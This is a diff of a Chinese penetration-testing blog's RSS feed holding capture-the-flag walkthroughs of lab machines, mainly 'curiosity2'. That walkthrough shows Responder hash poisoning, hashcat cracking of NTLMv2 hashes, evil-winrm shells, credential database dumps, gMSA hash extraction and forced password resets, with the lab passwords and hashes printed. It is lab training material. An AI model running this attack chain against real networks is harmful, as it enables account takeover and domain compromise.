+<img alt="assets/Pasted image 20241221150514.png" src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221150514.png"><br>然后在网站的日志里面可以获取到用户的密码<br>
+<img alt="assets/Pasted image 20241221152138.png" src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221152138.png"><br>
+/login=bubba:TuprimerP@ssword1234!<br>利用这个用户可以rdp到主机 20.20.20.5<br>
+登录后需要重置密码 因为密码过期了<br>Warning
+这里是西班牙键盘 ，输入密码的@不是我们正常的键盘输入的。 这里建议用屏幕键盘输入密码
+<br>进来后桌面就有用户flag <br><img alt="assets/Pasted image 20241221152758.png" src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221152758.png">!b1ngob0ngoP0ngoUseRfl4g!#]]></description><link>https://www.c1trus.top/24-渗透/thl/8.milanesa.html</link><guid isPermaLink="false">24-渗透/THL/8.Milanesa.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:47 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221135649.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221135649.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[7.Pildoritas]]></title><description><![CDATA[ 
+ <br><br>
+<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
+<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a><br>
+靶机链接<br>
+难度 ⭐️⭐️⭐️⭐️⭐️
+<br>剧情<br>
+著名制药公司“Pildoritas”遭遇了一场毁灭性的网络攻击。<br>
+在看似安全稳固的环境中，一群黑客成功侵入了他们的系统，将公司几乎完全摧毁成数字废墟。<br>
+公司的宝贵知识、记录和运营数据要么被删除，要么被加密。然而，攻击者在离开时留下了一条线索——<br>
+唯一的线索是一个文件：一份以 PCAP 格式保存的网络流量捕获文件。<br>
+现在，“Pildoritas”的命运掌握在你的手中。你是否拥有分析该文件、揭示真相并复现事件的能力？
+<br>]]></description><link>https://www.c1trus.top/24-渗透/thl/7.pildoritas.html</link><guid isPermaLink="false">24-渗透/THL/7.Pildoritas.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:47 GMT</pubDate></item><item><title><![CDATA[6.curiosity2]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
 
-<br><a data-tooltip-position="top" aria-label="2.1. 目录扫描" data-href="#2.1. 目录扫描" href="https://www.c1trus.top/about:blank#2.1._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 目录扫描</a>
-<br><a data-tooltip-position="top" aria-label="2.2. smb空会话检测" data-href="#2.2. smb空会话检测" href="https://www.c1trus.top/about:blank#2.2._smb空会话检测" class="internal-link" target="_self" rel="noopener nofollow">2.2. smb空会话检测</a>
+<br><a data-tooltip-position="top" aria-label="2.1. 端口扫描" data-href="#2.1. 端口扫描" href="https://www.c1trus.top/about:blank#2.1._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 端口扫描</a>
+<br><a data-tooltip-position="top" aria-label="2.2. ntlm中毒攻击" data-href="#2.2. ntlm中毒攻击" href="https://www.c1trus.top/about:blank#2.2._ntlm中毒攻击" class="internal-link" target="_self" rel="noopener nofollow">2.2. ntlm中毒攻击</a>
+<br><a data-tooltip-position="top" aria-label="2.3. 爆破Hash" data-href="#2.3. 爆破Hash" href="https://www.c1trus.top/about:blank#2.3._爆破Hash" class="internal-link" target="_self" rel="noopener nofollow">2.3. 爆破Hash</a>
 
 
-<br><a data-tooltip-position="top" aria-label="3. smb爆破" data-href="#3. smb爆破" href="https://www.c1trus.top/about:blank#3._smb爆破" class="internal-link" target="_self" rel="noopener nofollow">3. smb爆破</a>
-<br><a data-tooltip-position="top" aria-label="4. 提权" data-href="#4. 提权" href="https://www.c1trus.top/about:blank#4._提权" class="internal-link" target="_self" rel="noopener nofollow">4. 提权</a><br>
+<br><a data-tooltip-position="top" aria-label="3. sqlcmd操作" data-href="#3. sqlcmd操作" href="https://www.c1trus.top/about:blank#3._sqlcmd操作" class="internal-link" target="_self" rel="noopener nofollow">3. sqlcmd操作</a>
+<br><a data-tooltip-position="top" aria-label="4. bloodhound分析域内环境" data-href="#4. bloodhound分析域内环境" href="https://www.c1trus.top/about:blank#4._bloodhound分析域内环境" class="internal-link" target="_self" rel="noopener nofollow">4. bloodhound分析域内环境</a>
+<br><a data-tooltip-position="top" aria-label="5. 数据库获取信息" data-href="#5. 数据库获取信息" href="https://www.c1trus.top/about:blank#5._数据库获取信息" class="internal-link" target="_self" rel="noopener nofollow">5. 数据库获取信息</a>
+<br><a data-tooltip-position="top" aria-label="6. 密码喷涂" data-href="#6. 密码喷涂" href="https://www.c1trus.top/about:blank#6._密码喷涂" class="internal-link" target="_self" rel="noopener nofollow">6. 密码喷涂</a>
+<br><a data-tooltip-position="top" aria-label="7. 破解kdbx数据库文件" data-href="#7. 破解kdbx数据库文件" href="https://www.c1trus.top/about:blank#7._破解kdbx数据库文件" class="internal-link" target="_self" rel="noopener nofollow">7. 破解kdbx数据库文件</a>
+<br><a data-tooltip-position="top" aria-label="8. DCSync" data-href="#8. DCSync" href="https://www.c1trus.top/about:blank#8._DCSync" class="internal-link" target="_self" rel="noopener nofollow">8. DCSync</a><br>
 靶机链接<br>
-难度 ⭐️⭐️️
-<br><br>
-┌──(root㉿kali)-[~/Desktop/vulnyx/Admin]
-└─# nmap -sCV 192.168.56.20
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-22 23:28 EST
-Nmap scan report for 192.168.56.20
-Host is up (0.00076s latency).
-Not shown: 996 closed tcp ports (reset)
-PORT    STATE SERVICE       VERSION
-80/tcp  open  http          Microsoft IIS httpd 10.0
-| http-methods:
-|_  Potentially risky methods: TRACE
-|_http-title: IIS Windows
-|_http-server-header: Microsoft-IIS/10.0
-135/tcp open  msrpc         Microsoft Windows RPC
-139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
-445/tcp open  microsoft-ds?
-MAC Address: 08:00:27:5E:A6:CF (Oracle VirtualBox virtual NIC)
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+难度 ⭐️⭐️⭐️⭐️⭐️
+<br><br><br>┌──(root㉿kali)-[/home/kali/thl/curiosity2]
+└─# fscan -h 192.168.56.116
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _`' |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+192.168.56.116:135 open
+192.168.56.116:139 open
+192.168.56.116:445 open
+192.168.56.116:88 open
+[*] alive ports len is: 4
+start vulscan
+[*] NetBios 192.168.56.116  [+] DC:CONS\WIN-C73PROQLRHL
+[*] NetInfo
+[*]192.168.56.116
+   [-&gt;]WIN-C73PROQLRHL
+   [-&gt;]192.168.56.116
+   [-&gt;]10.16.41.51
+   [-&gt;]2409:8760:1e81:10::39d9
+已完成 4/4
+[*] 扫描结束,耗时: 2.092922428s
+
+┌──(root㉿kali)-[/home/kali/thl/curiosity2]
+└─# nmap -sCV 192.168.56.116
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 17:57 CST
+Nmap scan report for 192.168.56.116
+Host is up (0.00029s latency).
+Not shown: 990 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-10 16:57:42Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:WIN-C73PROQLRHL.cons.thl
+| Not valid before: 2024-10-11T16:05:23
+|_Not valid after:  2025-10-11T16:05:23
+|_ssl-date: 2024-12-10T16:58:30+00:00; +6h59m59s from scanner time.
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)
+|_ssl-date: 2024-12-10T16:58:30+00:00; +6h59m59s from scanner time.
+| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:WIN-C73PROQLRHL.cons.thl
+| Not valid before: 2024-10-11T16:05:23
+|_Not valid after:  2025-10-11T16:05:23
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)
+|_ssl-date: 2024-12-10T16:58:30+00:00; +6h59m59s from scanner time.
+| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:WIN-C73PROQLRHL.cons.thl
+| Not valid before: 2024-10-11T16:05:23
+|_Not valid after:  2025-10-11T16:05:23
+MAC Address: 08:00:27:C1:EE:2F (Oracle VirtualBox virtual NIC)
+Service Info: Host: WIN-C73PROQLRHL; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
 | smb2-security-mode:
 |   3:1:1:
-|_    Message signing enabled but not required
-|_nbstat: NetBIOS name: ADMIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:5e:a6:cf (Oracle VirtualBox virtual NIC)
-|_clock-skew: 6h59m58s
+|_    Message signing enabled and required
+|_nbstat: NetBIOS name: WIN-C73PROQLRHL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:c1:ee:2f (Oracle VirtualBox virtual NIC)
 | smb2-time:
-|   date: 2024-12-23T11:28:57
-|_  start_date: N/A
+|   date: 2024-12-10T16:58:21
+|_  start_date: 2024-12-10T16:56:53
+|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 13.13 seconds
+Nmap done: 1 IP address (1 host up) scanned in 73.57 seconds
+
+<br><br>┌──(root㉿kali)-[/home/kali/thl/curiosity2]
+└─# responder -I eth0
 
 
-<br><br>┌──(root㉿kali)-[~/Desktop/vulnyx/Admin]
-└─# gobuster dir -u http://192.168.56.20/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://192.168.56.20/
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Extensions:              php,html,txt,zip
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/tasks.txt            (Status: 200) [Size: 98]
-/Tasks.txt            (Status: 200) [Size: 98]
+[SMB] NTLMv2-SSP Client   : fe80::e880:b43a:2756:c900
+[SMB] NTLMv2-SSP Username : cons\Appolonia
+[SMB] NTLMv2-SSP Hash     : Appolonia::cons:49ad08d5b95f487e:7981C671B6509FFED9036CB51727F74D:010100000000000080A60B552D4BDB01CEC743A0ED3C72F20000000002000800380035005200410001001E00570049004E002D0054004B005A00410054004A0045004C0049003200440004003400570049004E002D0054004B005A00410054004A0045004C004900320044002E0038003500520041002E004C004F00430041004C000300140038003500520041002E004C004F00430041004C000500140038003500520041002E004C004F00430041004C000700080080A60B552D4BDB0106000400020000000800300030000000000000000000000000400000F8AC0EC0C53E58EC88B9F6134D5F79AEA985E41E98EE06169DEB1E85F052D0610A0010000000000000000000000000000000000009001C0063006900660073002F00530051004C00730065007200760065007200000000000000000000000000
+[*] [NBT-NS] Poisoned answer sent to 192.168.56.116 for name SQLDATABABASE (service: File Server)
+[*] [LLMNR]  Poisoned answer sent to fe80::e880:b43a:2756:c900 for name SQLDatababase
+[*] [LLMNR]  Poisoned answer sent to 192.168.56.116 for name SQLDatababase
+[*] [LLMNR]  Poisoned answer sent to fe80::e880:b43a:2756:c900 for name SQLDatababase
+[*] [LLMNR]  Poisoned answer sent to 192.168.56.116 for name SQLDatababase
+[SMB] NTLMv2-SSP Client   : fe80::e880:b43a:2756:c900
+[SMB] NTLMv2-SSP Username : cons\sqldb
+[SMB] NTLMv2-SSP Hash     : sqldb::cons:d7ed9707c16853ff:95D5F1D9D93D1C77A5C6B4E03B2BACDC:010100000000000080A60B552D4BDB017F14781EF42811660000000002000800380035005200410001001E00570049004E002D0054004B005A00410054004A0045004C0049003200440004003400570049004E002D0054004B005A00410054004A0045004C004900320044002E0038003500520041002E004C004F00430041004C000300140038003500520041002E004C004F00430041004C000500140038003500520041002E004C004F00430041004C000700080080A60B552D4BDB0106000400020000000800300030000000000000000000000000400000F8AC0EC0C53E58EC88B9F6134D5F79AEA985E41E98EE06169DEB1E85F052D0610A001000000000000000000000000000000000000900240063006900660073002F00530051004C004400610074006100620061006200610073006500000000000000000000000000
+
+<br><br>
+根据这个作者的习惯。rockyou一般都是爆破不出来的<br>
+换一个字典爆破
+<br>┌──(root㉿kali)-[/home/kali/thl/curiosity2]
+└─# hashcat -a 0 -m 5600 appolonia_ntlmv2.txt /usr/share/wordlists/seclists/Passwords/seasons.txt
+APPOLONIA::cons:49ad08d5b95f487e:7981c671b6509ffed9036cb51727f74d:010100000000000080a60b552d4bdb01cec743a0ed3c72f20000000002000800380035005200410001001e00570049004e002d0054004b005a00410054004a0045004c0049003200440004003400570049004e002d0054004b005a00410054004a0045004c004900320044002e0038003500520041002e004c004f00430041004c000300140038003500520041002e004c004f00430041004c000500140038003500520041002e004c004f00430041004c000700080080a60b552d4bdb0106000400020000000800300030000000000000000000000000400000f8ac0ec0c53e58ec88b9f6134d5f79aea985e41e98ee06169deb1e85f052d0610a0010000000000000000000000000000000000009001c0063006900660073002f00530051004c00730065007200760065007200000000000000000000000000:5umm3r@
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: APPOLONIA::cons:49ad08d5b95f487e:7981c671b6509ffed9...000000
+Time.Started.....: Mon Dec 16 16:25:24 2024 (0 secs)
+Time.Estimated...: Mon Dec 16 16:25:24 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/seclists/Passwords/seasons.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1764.7 kH/s (1.11ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 4096/5390 (75.99%)
+Rejected.........: 0/4096 (0.00%)
+Restore.Point....: 0/5390 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: $pr1ng -&gt; W1NT3R2021@
+Hardware.Mon.#1..: Util: 12%
+
+Started: Mon Dec 16 16:25:23 2024
+Stopped: Mon Dec 16 16:25:25 2024
 
 
-┌──(root㉿kali)-[~/Desktop/vulnyx/Admin]
-└─# curl http://192.168.56.20/tasks.txt
-Pending tasks:
 
- - Finish website
- - Update OS
- - Drink coffee
- - Rest
- - Change password
+SQLDB::cons:d7ed9707c16853ff:95d5f1d9d93d1c77a5c6b4e03b2bacdc:010100000000000080a60b552d4bdb017f14781ef42811660000000002000800380035005200410001001e00570049004e002d0054004b005a00410054004a0045004c0049003200440004003400570049004e002d0054004b005a00410054004a0045004c004900320044002e0038003500520041002e004c004f00430041004c000300140038003500520041002e004c004f00430041004c000500140038003500520041002e004c004f00430041004c000700080080a60b552d4bdb0106000400020000000800300030000000000000000000000000400000f8ac0ec0c53e58ec88b9f6134d5f79aea985e41e98ee06169deb1e85f052d0610a001000000000000000000000000000000000000900240063006900660073002f00530051004c004400610074006100620061006200610073006500000000000000000000000000:au7umn@
 
-By hope 
-<br>获取到了一个用户名 hope<br><br>
-┌──(root㉿kali)-[~/Desktop/vulnyx/Admin]
-└─# smbmap -H 192.168.56.20 -u guest -p ' '
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: SQLDB::cons:d7ed9707c16853ff:95d5f1d9d93d1c77a5c6b4...000000
+Time.Started.....: Mon Dec 16 16:26:39 2024 (0 secs)
+Time.Estimated...: Mon Dec 16 16:26:39 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/seclists/Passwords/seasons.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1785.6 kH/s (1.52ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 4096/5390 (75.99%)
+Rejected.........: 0/4096 (0.00%)
+Restore.Point....: 0/5390 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: $pr1ng -&gt; W1NT3R2021@
+Hardware.Mon.#1..: Util: 12%
+
+Started: Mon Dec 16 16:26:39 2024
+Stopped: Mon Dec 16 16:26:41 2024
+
+
+<br>成功获取到了两个账号密码<br>SQLDB ： au7umn@ <br>
+APPOLONIA ： 5umm3r@<br>测试后两个都可以登录上去<br>┌──(root㉿kali)-[/home/kali/thl/curiosity2]
+└─# evil-winrm -i 192.168.56.116 -u APPOLONIA -p '5umm3r@'
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\appolonia\Documents&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+┌──(root㉿kali)-[/home/kali/thl/curiosity2]
+└─# evil-winrm -i 192.168.56.116 -u SQLDB -p 'au7umn@'
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\sqldb\Documents&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+<br><br>获取数据库信息<br>*Evil-WinRM* PS C:\Users\sqldb\Documents&gt; reg query "HKLM\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL"
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL
+    SQLEXPRESS    REG_SZ    MSSQL15.SQLEXPRESS
+<br>数据库名字是 SQLEXPRESS 但完整的名字是 WIN-C73PROQLRHL\SQLEXPRESS<br>*Evil-WinRM* PS C:\Users\sqldb\Documents&gt; sqlcmd -E -S 'WIN-C73PROQLRHL\SQLEXPRESS' -Q 'select @@version;'
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
+        Sep 24 2019 13:48:23
+        Copyright (C) 2019 Microsoft Corporation
+        Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 &lt;X64&gt; (Build 14393: ) (Hypervisor)
+
+(1 rows affected)\
+<br>查询数据库名称<br>*Evil-WinRM* PS C:\Users\sqldb\Documents&gt; sqlcmd -E -S 'WIN-C73PROQLRHL\SQLEXPRESS' -Q 'SELECT name FROM master.dbo.sysdatabases;'
+name
+--------------------------------------------------------------------------------------------------------------------------------
+master
+tempdb
+model
+msdb
+CredentialsDB
+toolsdb
+
+(6 rows affected)
+
+<br>里面有一个 CredentialsDB 数据库 里面可能有我们可以利用的 查看一下<br>*Evil-WinRM* PS C:\Users\sqldb\Documents&gt; sqlcmd -E -S 'WIN-C73PROQLRHL\SQLEXPRESS' -d CredentialsDB -Q "SELECT * FROM dbo.Credentials;"
+ID          Username                                           Password
+----------- -------------------------------------------------- ----------------------------------------------------------------------------------------------------
+          1 sqlsvc                                             a6d888301de7aa3b380a691d32837627
+
+(1 rows affected)
+
+<br>破解一下这个md5<br>a6d888301de7aa3b380a691d32837627:$PRING2021#
+<br>获取到 sqlsvc 用户的密码 $PRING2021#<br>
+收集一下域内信息<br><br>┌──(root㉿kali)-[/home/kali/thl/curiosity2]
+└─# netexec ldap 192.168.56.116 -u 'SQLDB' -p 'au7umn@'  --bloodhound --collection All --dns-server 192.168.56.116
+SMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False)
+LDAP        192.168.56.116  389    WIN-C73PROQLRHL  [+] cons.thl\SQLDB:au7umn@
+LDAP        192.168.56.116  389    WIN-C73PROQLRHL  Resolved collection methods: acl, group, localadmin, psremote, trusts, objectprops, session, rdp, dcom, container
+LDAP        192.168.56.116  389    WIN-C73PROQLRHL  Done in 00M 00S
+LDAP        192.168.56.116  389    WIN-C73PROQLRHL  Compressing output into /root/.nxc/logs/WIN-C73PROQLRHL_192.168.56.116_2024-12-16_165009_bloodhound.zip
+
+<br>使用 netexec 收集失败。可能是那里出了问题<br>
+直接传SharpHound.exe 上去收集<br>*Evil-WinRM* PS C:\Users\sqlsvc\Documents&gt; upload /home/kali/thl/curiosity2/SharpHound.exe
+
+Info: Uploading /home/kali/thl/curiosity2/SharpHound.exe to C:\Users\sqlsvc\Documents\SharpHound.exe
+
+Data: 1395368 bytes of 1395368 bytes copied
+
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\sqlsvc\Documents&gt; ls
+
+
+    Directory: C:\Users\sqlsvc\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       10/31/2024   6:23 PM           2231 Database.kdbx
+-a----       12/16/2024   4:55 PM        1046528 SharpHound.exe
+
+
+*Evil-WinRM* PS C:\Users\sqlsvc\Documents&gt; ./SharpHound.exe
+2024-12-16T16:55:38.5773646+01:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
+2024-12-16T16:55:39.0929517+01:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2024-12-16T16:55:39.4209905+01:00|INFORMATION|Initializing SharpHound at 16:55 on 16/12/2024
+2024-12-16T16:55:42.0303498+01:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for cons.thl : WIN-C73PROQLRHL.cons.thl
+2024-12-16T16:55:42.1237157+01:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2024-12-16T16:55:42.5300046+01:00|INFORMATION|Beginning LDAP search for cons.thl
+2024-12-16T16:55:42.6708951+01:00|INFORMATION|Producer has finished, closing LDAP channel
+2024-12-16T16:55:42.6868321+01:00|INFORMATION|LDAP channel closed, waiting for consumers
+2024-12-16T16:56:12.8426741+01:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
+2024-12-16T16:56:29.4678294+01:00|INFORMATION|Consumers finished, closing output channel
+2024-12-16T16:56:29.5152889+01:00|INFORMATION|Output channel closed, waiting for output task to complete
+Closing writers
+2024-12-16T16:56:29.8740248+01:00|INFORMATION|Status: 192 objects finished (+192 4.085106)/s -- Using 42 MB RAM
+2024-12-16T16:56:29.8740248+01:00|INFORMATION|Enumeration finished in 00:00:47.3672286
+2024-12-16T16:56:30.0931388+01:00|INFORMATION|Saving cache with stats: 152 ID to type mappings.
+ 152 name to SID mappings.
+ 0 machine sid mappings.
+ 2 sid to domain mappings.
+ 0 global catalog mappings.
+2024-12-16T16:56:30.1869703+01:00|INFORMATION|SharpHound Enumeration Completed at 16:56 on 16/12/2024! Happy Graphing!
+*Evil-WinRM* PS C:\Users\sqlsvc\Documents&gt; ls
+
+
+    Directory: C:\Users\sqlsvc\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       12/16/2024   4:56 PM          16777 20241216165628_BloodHound.zip
+-a----       10/31/2024   6:23 PM           2231 Database.kdbx
+-a----       12/16/2024   4:56 PM          22359 NzAyMzNmYzYtYzFjNi00MDYxLTg5ZTYtY2FmOWMwODg1MzZm.bin
+-a----       12/16/2024   4:55 PM        1046528 SharpHound.exe
+
+
+*Evil-WinRM* PS C:\Users\sqlsvc\Documents&gt; download 20241216165628_BloodHound.zip
+
+Info: Downloading C:\Users\sqlsvc\Documents\20241216165628_BloodHound.zip to 20241216165628_BloodHound.zip
+
+Info: Download successful!
+
+<br>
+在收集时发现当前文件夹下面有一个 Database.kdbx 我们将其下载下来<br>
+.kdbx 是 KeePass 密码管理器使用的一种加密数据库文件格式。是 KeePass 2.x 及更高版本使用的数据库文件格式
+<br>我们当前用户 SQLSVC 是属于 SVCACCOUNTS 组<br>
+<img alt="Pasted image 20241216170557" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216170557.png" referrerpolicy="no-referrer"><br>
+而且该组可以读取 GMSA_SQL$ 机器用户的密码<br>
+<img alt="Pasted image 20241216170702" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216170702.png" referrerpolicy="no-referrer"><br>获取密码<br>┌──(root㉿kali)-[/home/kali/thl/curiosity2]
+└─# nxc ldap 192.168.56.116 -u 'sqlsvc' -p '$PRING2021#' --gmsa
+SMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False)
+LDAPS       192.168.56.116  636    WIN-C73PROQLRHL  [+] cons.thl\sqlsvc:$PRING2021#
+LDAPS       192.168.56.116  636    WIN-C73PROQLRHL  [*] Getting GMSA Passwords
+LDAPS       192.168.56.116  636    WIN-C73PROQLRHL  Account: GMSA_SQL$            NTLM: 1ac0f76a248b111e724b9ca39da34988
+
+<br>分析该机器用户的权限可以发现可以修改另一个用户的密码<br>
+<img alt="Pasted image 20241216171032" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216171032.png" referrerpolicy="no-referrer"><br>
+修改密码<br>┌──(root㉿kali)-[/home/kali/thl/curiosity2]
+└─# impacket-changepasswd CONS.THL/toolsdb@cons.thl -newpass 'admin!@#45' -altuser "GMSA_SQL$" -althash ':1ac0f76a248b111e724b9ca39da34988' -no-pass -reset
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Setting the password of CONS.THL\toolsdb as CONS.THL\GMSA_SQL$
+[*] Connecting to DCE/RPC as CONS.THL\GMSA_SQL$
+[*] Password was changed successfully.
+[!] User no longer has valid AES keys for Kerberos, until they change their password again.
+<br>根据这个名字<br><br>登录 toolsdb 用户 ，根据这个用户名就能猜测出多半这个用户数据库里面是有东西的，而且载上面数据库查询时时发现有一个 toolsdb 数据库 但是我们当时用户没有权限查询<br>利用这个用户查看 toolsdb 数据库的内容<br>
+查看数据库表名<br>*Evil-WinRM* PS C:\Users\toolsdb\Documents&gt; sqlcmd -E -S "localhost\SQLEXPRESS" -d "toolsdb" -Q "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';"
+TABLE_NAME
+--------------------------------------------------------------------------------------------------------------------------------
+users
+
+(1 rows affected)
+
+<br>查看users表的内容<br>*Evil-WinRM* PS C:\Users\toolsdb\Documents&gt; sqlcmd -E -S 'WIN-C73PROQLRHL\SQLEXPRESS' -d toolsdb -Q "SELECT * FROM users;"
+id          username                                           password
+----------- -------------------------------------------------- --------------------------------------------------
+          1 user_6B482050                                      433129A1!@1
